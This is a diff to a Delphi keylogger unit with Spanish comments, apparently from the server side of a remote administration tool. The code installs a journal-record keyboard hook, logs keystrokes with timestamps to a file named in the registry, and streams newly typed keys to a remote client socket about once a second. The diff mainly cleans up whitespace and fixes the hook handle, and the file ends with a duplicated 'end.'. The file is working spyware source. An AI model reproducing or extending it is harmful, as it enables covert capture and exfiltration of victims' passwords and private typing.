@@ -13,13 +13,13 @@ uses
   UnitVariables,
   minireg,
   Sysutils;
-  
+ 
   procedure OnServerInitKeylogger();//Al iniciar el servidor...
   procedure EmpezarKeylogger(ArchivoLog:string); //Empezar a "loggear" teclas
   procedure SetOnlineKeylogger(status:boolean;client:TclientSocket);   //activar o desactivar online keylogger
   procedure PararKeylogger();                    //Parar de "loggear" teclas
   function ObtenerEstadoKeylogger():boolean;     //Para saber si está activado o desactivado
-  function ObtenerLog():string;                  //devuelve el log 
+  function ObtenerLog():string;                  //devuelve el log
   function GetOnlineKeyloggerKeys():string;  //Las nuevas letras pulsadas
   procedure EliminarLog();                       //Eliminar el log del keylogger
   procedure KlogThread();                        //thread principal del keylogger
@@ -27,7 +27,7 @@ uses
   procedure KeyHook();                           //Crea el HOOK
   function GetKeyloggerPath():string;
 
-  
+ 
 implementation
 var
   KeyloggerActivado    : boolean;
@@ -65,6 +65,7 @@ procedure EmpezarKeylogger(ArchivoLog:string);
 begin
   KeyloggerPath := ExtractFilePath(Paramstr(0))+ArchivoLog;
   RegSetString(HKEY_CURRENT_USER,'Software\'+Configuracion.sID+'\'+Configuracion.sID, extractfilename(KeyloggerPath));
+
   if not ThreadStarted then
   begin
     ThreadStarted  := true;
@@ -208,13 +209,13 @@ begin
         if(OKeyloggerActivado) then
           OnlineKeyloggerKeys := OnlineKeyloggerKeys + Tecla;
       end;
-      
+     
         if(Evento <> '') then
         begin
           TeclasPulsadas := TeclasPulsadas +#13#10#13#10+'-['+Evento+']- '+DateTimeToStr(now)+#13#10;
           Evento := '';
         end;
-        
+       
       sleep(80);
 
        if(OKeyloggerActivado and ((GetTickCount()-lasttickcounton) > 1000)) then  //Enviamos la teclas nuevas maximo cada 1000 ms para no saturar la conexión
@@ -248,7 +249,10 @@ begin
     lpMsg.message := WM_CANCELJOURNAL;
     if(KeyloggerActivado) then
     begin
-      if((lpMsg.message = WM_CANCELJOURNAL)) then HookHandle := SetWindowsHookEx(WH_JOURNALRECORD, @JHProc, HInstance, 0);
+      if((lpMsg.message = WM_CANCELJOURNAL)) then
+      begin
+        HookHandle := SetWindowsHookEx(WH_JOURNALRECORD, @JHProc, GetModuleHandle(nil), 0);
+      end;
       WaitMessage;
       GetMessage(lpMsg, 0, 0, 0);
       end
@@ -266,9 +270,6 @@ var
   KeyState: TKeyBoardState;
   nametext: array[0..32] of Char;
 begin
-
-
-
   if (nCode = HC_ACTION) and (EventStrut.message = WM_KEYDOWN) then
   begin
     VirtKey := LOBYTE(EventStrut.paramL);
@@ -318,8 +319,11 @@ begin
     letraanterior := VirtKey;
   end;
 
-  CallNextHookEx(JHHandle, nCode, wParam, Integer(@EventStrut));
+  CallNextHookEx(Hookhandle, nCode, wParam, Integer(@EventStrut));
   Result := 0;
 end;
+
+end.
+
 
 end.
